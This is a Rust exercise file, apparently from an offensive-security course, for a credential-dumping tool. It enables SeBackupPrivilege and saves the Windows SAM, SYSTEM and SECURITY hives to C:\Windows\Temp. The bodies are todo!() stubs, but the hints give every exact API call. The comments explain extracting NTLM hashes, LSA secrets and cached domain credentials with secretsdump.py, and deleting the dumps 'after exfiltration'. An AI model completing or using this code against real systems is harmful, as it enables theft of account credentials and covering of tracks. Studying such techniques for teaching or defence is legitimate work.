use windows::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, LUID};
use windows::Win32::Security::{
    AdjustTokenPrivileges, LookupPrivilegeValueA, OpenProcessToken,
    LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES,
    TOKEN_PRIVILEGES, TOKEN_QUERY,
};
use windows::Win32::System::Registry::{
    RegCloseKey, RegOpenKeyExA, RegSaveKeyA, HKEY_LOCAL_MACHINE, KEY_READ,
    REG_OPEN_CREATE_OPTIONS,
};
use windows::Win32::System::Threading::GetCurrentProcess;
use windows::core::PCSTR;

// Enable a named privilege on the current process token.
// Returns true if the privilege was successfully enabled.
//
// Hint: this is the same three-call pattern from module 20:
//   OpenProcessToken → LookupPrivilegeValueA → AdjustTokenPrivileges
// After AdjustTokenPrivileges, check GetLastError() for ERROR_NOT_ALL_ASSIGNED
// (the function returns Ok(()) even when the privilege is absent).
fn enable_privilege(name: PCSTR) -> bool {
    unsafe {
        let mut h_token: HANDLE = HANDLE::default();
        todo!("OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut h_token)");

        let mut luid = LUID::default();
        todo!("LookupPrivilegeValueA(PCSTR::null(), name, &mut luid)");

        let tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };
        todo!("AdjustTokenPrivileges(h_token, false, Some(&tp), 0, None, None)");

        // IMPORTANT: AdjustTokenPrivileges returns Ok(()) even if the privilege
        // was not granted. Check GetLastError() for ERROR_NOT_ALL_ASSIGNED.
        let err = GetLastError();
        // ERROR_SUCCESS = 0 means the privilege was adjusted successfully
        todo!("check GetLastError() and return true/false; close h_token");
        false
    }
}

// Open a registry hive with REG_OPTION_BACKUP_RESTORE and save it to a file.
//
// hive_path: e.g. b"SAM\0" — subkey of HKEY_LOCAL_MACHINE
// save_path: e.g. b"C:\\Windows\\Temp\\sam.save\0" — must NOT already exist
//
// Hint: RegOpenKeyExA(HKEY_LOCAL_MACHINE, hive_path, REG_OPEN_CREATE_OPTIONS(4), KEY_READ, &mut hkey)
//       REG_OPEN_CREATE_OPTIONS(4) is REG_OPTION_BACKUP_RESTORE — without this flag the backup
//       privilege is ignored and you will still get ERROR_ACCESS_DENIED on SAM/SECURITY.
//       Then: RegSaveKeyA(hkey, save_path, None)
fn dump_hive(hive_path: PCSTR, save_path: PCSTR) {
    unsafe {
        let mut hkey = windows::Win32::System::Registry::HKEY::default();

        // Step: open the key with backup privilege flag
        // REG_OPEN_CREATE_OPTIONS(4) = REG_OPTION_BACKUP_RESTORE
        todo!(
            "RegOpenKeyExA(HKEY_LOCAL_MACHINE, hive_path, REG_OPEN_CREATE_OPTIONS(4), KEY_READ, &mut hkey); \
             check WIN32_ERROR return == ERROR_SUCCESS"
        );

        // Step: save the entire hive subtree to a file
        // The file must not already exist — delete it first if re-running
        todo!("RegSaveKeyA(hkey, save_path, None); check WIN32_ERROR return");

        todo!("RegCloseKey(hkey)");
    }
}

fn main() {
    unsafe {
        // Step 1 — Enable SeBackupPrivilege.
        // This privilege allows opening registry keys and files regardless of their ACLs.
        // Administrator accounts hold it but it is disabled by default.
        // If this returns false, the hive opens below will fail with ERROR_ACCESS_DENIED.
        //
        // Hint: call enable_privilege(PCSTR(b"SeBackupPrivilege\0".as_ptr()))
        todo!("enable_privilege(b\"SeBackupPrivilege\0\")");

        // (Optional) Enable SeSecurityPrivilege too — needed for SECURITY hive on some builds.
        // Hint: call enable_privilege(PCSTR(b"SeSecurityPrivilege\0".as_ptr()))

        // Step 2 — Dump the SAM hive.
        // Contains NTLM hashes for all local accounts, encrypted with the boot key from SYSTEM.
        // IMPORTANT: REG_OPTION_BACKUP_RESTORE (value 4) MUST be passed to RegOpenKeyExA —
        // without it, the backup privilege has no effect and access is still denied.
        //
        // Hint: dump_hive(PCSTR(b"SAM\0".as_ptr()), PCSTR(b"C:\\Windows\\Temp\\sam.save\0".as_ptr()))
        todo!("dump SAM hive → C:\\Windows\\Temp\\sam.save");

        // Step 3 — Dump the SYSTEM hive.
        // Contains the boot key (SysKey) required to decrypt the SAM hashes offline.
        // Without this file, secretsdump.py cannot derive the decryption key.
        //
        // Hint: same as step 2 with "SYSTEM" and "system.save"
        todo!("dump SYSTEM hive → C:\\Windows\\Temp\\system.save");

        // Step 4 — Dump the SECURITY hive.
        // Contains LSA secrets: service account passwords, DCC2 domain cached credentials,
        // and the machine account hash. May require SeSecurityPrivilege in addition to
        // SeBackupPrivilege on some Windows versions.
        //
        // Hint: same as step 2 with "SECURITY" and "security.save"
        todo!("dump SECURITY hive → C:\\Windows\\Temp\\security.save");

        // Step 5 — Report success.
        println!("[+] Hives saved to C:\\Windows\\Temp\\");
        println!("[+] Parse offline with:");
        println!("      secretsdump.py -sam sam.save -system system.save -security security.save LOCAL");

        // Remember to delete the files after exfiltration:
        //   del C:\Windows\Temp\sam.save C:\Windows\Temp\system.save C:\Windows\Temp\security.save
    }
}
